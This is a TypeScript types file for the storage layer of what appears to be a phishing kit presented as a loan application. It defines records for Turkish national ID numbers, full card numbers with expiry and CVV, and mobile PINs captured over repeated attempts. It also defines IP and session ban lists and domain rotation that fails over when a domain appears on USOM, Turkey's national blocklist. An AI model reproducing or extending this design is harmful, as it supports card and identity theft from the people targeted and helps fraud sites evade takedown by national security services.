export type ApplicantStatus = "in_progress" | "completed" | "failed";

import type { FailoverEvent, SiteDomain } from "@/lib/domains/types";

export interface Applicant {
  id: string;
  sessionId: string;
  ipAddress: string;
  status: ApplicantStatus;
  currentAttempt: number;
  createdAt: string;
  completedAt: string | null;
}

export interface AttemptInput {
  tcKimlik: string;
  firstName: string;
  lastName: string;
  phone: string;
  birthDate: string;
  loanAmount: number;
  loanTerm: number;
  cardNumber: string;
  cardExpiry: string;
  cardCvv: string;
  noCreditCard: boolean;
  mobilePin: string;
}

export interface Attempt extends AttemptInput {
  id: string;
  applicantId: string;
  attemptNumber: number;
  createdAt: string;
}

export type BanType = "ip" | "session" | "tc";

export interface BanEntry {
  id: string;
  type: BanType;
  value: string;
  reason?: string;
  createdAt: string;
  expiresAt: string | null;
}

export interface AccessLogEntry {
  id: string;
  ip: string;
  sessionId?: string;
  path: string;
  userAgent?: string;
  blocked: boolean;
  blockReason?: string;
  createdAt: string;
}

export interface Store {
  applicants: Applicant[];
  attempts: Attempt[];
  accessLogs: AccessLogEntry[];
  bans: BanEntry[];
  siteDomains: SiteDomain[];
}

export interface ApplicantWithAttempts extends Applicant {
  attempts: Attempt[];
}

export interface StorageAdapter {
  createApplicant(sessionId: string, ipAddress?: string): Promise<Applicant>;
  getApplicantBySession(sessionId: string): Promise<Applicant | null>;
  getApplicant(id: string): Promise<ApplicantWithAttempts | null>;
  listApplicants(): Promise<ApplicantWithAttempts[]>;
  addAttempt(applicantId: string, data: AttemptInput): Promise<Attempt>;
  updateApplicantStatus(
    id: string,
    status: ApplicantStatus,
    completedAt?: string
  ): Promise<void>;
  logAccess(entry: Omit<AccessLogEntry, "id" | "createdAt">): Promise<AccessLogEntry>;
  listAccessLogs(limit?: number): Promise<AccessLogEntry[]>;
  clearAccessLogs(): Promise<void>;
  listBans(): Promise<BanEntry[]>;
  addBan(
    type: BanType,
    value: string,
    reason?: string,
    expiresAt?: string | null
  ): Promise<BanEntry>;
  removeBan(id: string): Promise<boolean>;
  checkBan(params: {
    ip?: string;
    sessionId?: string;
    tcKimlik?: string;
  }): Promise<{ banned: boolean; reason?: string; ban?: BanEntry }>;
  listSiteDomains(): Promise<SiteDomain[]>;
  getActiveSiteDomain(): Promise<SiteDomain | null>;
  addSiteDomain(
    hostname: string,
    status?: SiteDomain["status"],
    meta?: { zoneRoot?: string; hostType?: SiteDomain["hostType"] }
  ): Promise<SiteDomain>;
  setActiveSiteDomain(hostname: string): Promise<SiteDomain>;
  updateSiteDomainUsomCheck(
    hostname: string,
    blocked: boolean,
    checkedAt: string
  ): Promise<void>;
  removeSiteDomain(hostname: string): Promise<boolean>;
  getSiteSetting(key: string): Promise<string | null>;
  setSiteSetting(key: string, value: string): Promise<void>;
  listFailoverEvents(limit?: number): Promise<FailoverEvent[]>;
  logFailoverEvent(event: {
    fromHostname: string;
    toHostname: string | null;
    trigger: "cron" | "manual";
    usomCheckedAt: string;
  }): Promise<FailoverEvent>;
}
